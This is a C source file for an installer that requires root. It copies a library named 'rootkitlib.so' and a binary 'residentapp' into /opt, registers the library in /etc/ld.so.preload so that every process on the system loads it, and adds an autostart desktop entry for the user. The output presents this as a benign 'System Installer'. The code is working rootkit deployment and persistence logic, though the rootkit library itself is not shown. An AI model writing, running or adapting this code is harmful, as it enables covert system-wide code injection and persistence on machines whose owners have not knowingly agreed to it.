// installer.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <errno.h>
#include <libgen.h>
#include <pwd.h>
#include <limits.h>
#include <sys/types.h>
#include <fcntl.h>

#define LD_SO_PRELOAD "/etc/ld.so.preload"
#define AUTOSTART_DIR ".config/autostart"
#define DESKTOP_FILE_NAME "Res.desktop"

// Function to get the directory where the installer is located
char* get_installer_dir() {
    static char path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len == -1) {
        perror("readlink");
        return NULL;
    }
    path[len] = '\0';
    return dirname(path);
}

// Function to add .so path to ld.so.preload (idempotent)
int add_to_ld_preload(const char* so_path) {
    FILE* fp;
    char line[PATH_MAX];
    int found = 0;

    // Verify so_path exists and is readable
    if (access(so_path, R_OK) != 0) {
        fprintf(stderr, "Shared object '%s' does not exist or is not readable: %s\n", so_path, strerror(errno));
        return -1;
    }

    // Read existing preload file (if any) and check for duplicate
    fp = fopen(LD_SO_PRELOAD, "r");
    if (fp != NULL) {
        while (fgets(line, sizeof(line), fp)) {
            // remove newline and whitespace
            line[strcspn(line, "\r\n")] = 0;
            // skip empty lines and comments
            char *trim = line;
            while (*trim == ' ' || *trim == '\t') trim++;
            if (*trim == '\0' || *trim == '#') continue;
            if (strcmp(trim, so_path) == 0) {
                found = 1;
                break;
            }
        }
        fclose(fp);
    }

    if (found) {
        printf("Path already exists in %s\n", LD_SO_PRELOAD);
        return 0;
    }

    // Append the path (atomic-ish: use O_APPEND)
    int fd = open(LD_SO_PRELOAD, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd == -1) {
        fprintf(stderr, "Failed to open %s for append: %s\n", LD_SO_PRELOAD, strerror(errno));
        return -1;
    }

    ssize_t written = dprintf(fd, "%s\n", so_path);
    close(fd);
    if (written < 0) {
        perror("Failed to write to ld.so.preload");
        return -1;
    }

    printf("Added %s to %s\n", so_path, LD_SO_PRELOAD);
    return 0;
}

// Function to copy file
int copy_file(const char* src, const char* dst) {
    FILE *source = NULL, *dest = NULL;
    char buffer[8192];
    size_t bytes;

    source = fopen(src, "rb");
    if (source == NULL) {
        fprintf(stderr, "Failed to open source file '%s': %s\n", src, strerror(errno));
        return -1;
    }

    // ensure destination directory exists
    char dst_copy[PATH_MAX];
    strncpy(dst_copy, dst, PATH_MAX-1);
    dst_copy[PATH_MAX-1] = '\0';
    char *dir = dirname(dst_copy);
    if (dir != NULL) {
        struct stat st = {0};
        if (stat(dir, &st) == -1) {
            if (mkdir(dir, 0755) == -1 && errno != EEXIST) {
                fprintf(stderr, "Failed to create directory '%s': %s\n", dir, strerror(errno));
                fclose(source);
                return -1;
            }
        }
    }

    dest = fopen(dst, "wb");
    if (dest == NULL) {
        fprintf(stderr, "Failed to open destination file '%s': %s\n", dst, strerror(errno));
        fclose(source);
        return -1;
    }

    while ((bytes = fread(buffer, 1, sizeof(buffer), source)) > 0) {
        if (fwrite(buffer, 1, bytes, dest) != bytes) {
            perror("Write error");
            fclose(source);
            fclose(dest);
            return -1;
        }
    }

    fclose(source);
    fclose(dest);

    // Make executable
    if (chmod(dst, 0755) != 0) {
        fprintf(stderr, "Failed to chmod '%s': %s\n", dst, strerror(errno));
        // not fatal
    }

    return 0;
}

// Function to create autostart desktop entry (uses user's home dir)
int create_autostart_entry(const char* exec_path, const char* app_name, const char* user_home) {
    char autostart_path[PATH_MAX];
    char desktop_file_path[PATH_MAX];

    if (user_home == NULL || exec_path == NULL || app_name == NULL) {
        fprintf(stderr, "Invalid parameters to create_autostart_entry\n");
        return -1;
    }

    // Build autostart path
    if (snprintf(autostart_path, sizeof(autostart_path), "%s/%s", user_home, AUTOSTART_DIR) >= (int)sizeof(autostart_path)) {
        fprintf(stderr, "Autostart path too long\n");
        return -1;
    }

    // Make sure autostart dir exists (we assume caller has appropriate uid/gid set)
    if (mkdir(autostart_path, 0755) == -1 && errno != EEXIST) {
        fprintf(stderr, "Failed to create autostart directory '%s': %s\n", autostart_path, strerror(errno));
        return -1;
    }

    // Desktop file path
    if (snprintf(desktop_file_path, sizeof(desktop_file_path), "%s/%s", autostart_path, DESKTOP_FILE_NAME) >= (int)sizeof(desktop_file_path)) {
        fprintf(stderr, "Desktop file path too long\n");
        return -1;
    }

    FILE* fp = fopen(desktop_file_path, "w");
    if (fp == NULL) {
        fprintf(stderr, "Failed to create desktop file '%s': %s\n", desktop_file_path, strerror(errno));
        return -1;
    }

    fprintf(fp, "[Desktop Entry]\n");
    fprintf(fp, "Type=Application\n");
    fprintf(fp, "Name=%s\n", app_name);
    fprintf(fp, "Exec=%s\n", exec_path);
    fprintf(fp, "Hidden=false\n");
    fprintf(fp, "NoDisplay=false\n");
    fprintf(fp, "X-GNOME-Autostart-enabled=true\n");
    fprintf(fp, "Comment=Automatically started application\n");

    fclose(fp);

    printf("Created autostart entry at: %s\n", desktop_file_path);
    return 0;
}

int main(int argc, char* argv[]) {
    char so_source[PATH_MAX];
    char exec_source[PATH_MAX];
    char exec_dest[PATH_MAX];
    char so_dest[PATH_MAX];
    char* installer_dir;

    if (geteuid() != 0) {
        fprintf(stderr, "This installer must be run as root (use sudo)\n");
        return 1;
    }

    printf("=== System Installer ===\n\n");

    // Get installer directory
    installer_dir = get_installer_dir();
    if (installer_dir == NULL) {
        fprintf(stderr, "Failed to get installer directory\n");
        return 1;
    }

    printf("Installer directory: %s\n\n", installer_dir);

    const char* SO_FILENAME = "rootkitlib.so";
    const char* EXEC_FILENAME = "residentapp";
    const char* INSTALL_PATH = "/opt/residentapp";
    const char* APP_NAME = "Resident Application";

    if (snprintf(so_source, sizeof(so_source), "%s/%s", installer_dir, SO_FILENAME) >= (int)sizeof(so_source)) {
        fprintf(stderr, "so_source path too long\n");
        return 1;
    }
    if (snprintf(exec_source, sizeof(exec_source), "%s/%s", installer_dir, EXEC_FILENAME) >= (int)sizeof(exec_source)) {
        fprintf(stderr, "exec_source path too long\n");
        return 1;
    }

    if (snprintf(exec_dest, sizeof(exec_dest), "%s/%s", INSTALL_PATH, EXEC_FILENAME) >= (int)sizeof(exec_dest)) {
        fprintf(stderr, "exec_dest path too long\n");
        return 1;
    }
    if (snprintf(so_dest, sizeof(so_dest), "%s/%s", INSTALL_PATH, SO_FILENAME) >= (int)sizeof(so_dest)) {
        fprintf(stderr, "so_dest path too long\n");
        return 1;
    }

    // Create installation directory
    printf("Creating installation directory: %s\n", INSTALL_PATH);
    if (mkdir(INSTALL_PATH, 0755) == -1 && errno != EEXIST) {
        perror("Failed to create installation directory");
        return 1;
    }

    // Copy executable
    printf("Installing executable to: %s\n", exec_dest);
    if (copy_file(exec_source, exec_dest) != 0) {
        fprintf(stderr, "Failed to copy executable\n");
        return 1;
    }

    // Copy shared object into installation directory
    printf("Installing shared object to: %s\n", so_dest);
    if (copy_file(so_source, so_dest) != 0) {
        fprintf(stderr, "Failed to copy shared object\n");
        return 1;
    }

    // Add .so to ld.so.preload using installed absolute path
    printf("Adding shared library to %s\n", LD_SO_PRELOAD);
    if (add_to_ld_preload(so_dest) != 0) {
        fprintf(stderr, "Failed to add to %s\n", LD_SO_PRELOAD);
        return 1;
    }

    // Get the actual user (not root when using sudo)
    const char* sudo_user = getenv("SUDO_USER");
    struct passwd* pw = NULL;

    if (sudo_user != NULL) {
        pw = getpwnam(sudo_user);
    } else {
        pw = getpwuid(getuid());
    }

    if (pw == NULL) {
        fprintf(stderr, "Failed to get user information\n");
        return 1;
    }

    // Temporarily drop privileges to create user files
    uid_t orig_euid = geteuid();
    gid_t orig_egid = getegid();

    if (setegid(pw->pw_gid) != 0) {
        perror("Failed to setegid to user");
        return 1;
    }
    if (seteuid(pw->pw_uid) != 0) {
        perror("Failed to seteuid to user");
        // try to restore group before exiting
        setegid(orig_egid);
        return 1;
    }

    // Create autostart entry as the target user
    printf("Creating autostart entry for user: %s\n", pw->pw_name);
    if (create_autostart_entry(exec_dest, APP_NAME, pw->pw_dir) != 0) {
        fprintf(stderr, "Failed to create autostart entry\n");
        // restore privileges before exiting
        seteuid(orig_euid);
        setegid(orig_egid);
        return 1;
    }

    // Restore privileges
    if (seteuid(orig_euid) != 0) {
        perror("Failed to restore euid");
        // try to continue
    }
    if (setegid(orig_egid) != 0) {
        perror("Failed to restore egid");
        // try to continue
    }

    printf("\n=== Installation Complete ===\n");
    printf("Executable installed to: %s\n", exec_dest);
    printf("Shared library installed to: %s\n", so_dest);
    printf("Shared library preloaded from: %s\n", so_dest);
    printf("Autostart entry created for: %s\n", pw->pw_name);
    printf("\nThe application will start automatically on next boot/login (depending on DE).\n");
    printf("You can also run it manually: %s\n", exec_dest);

    return 0;
}
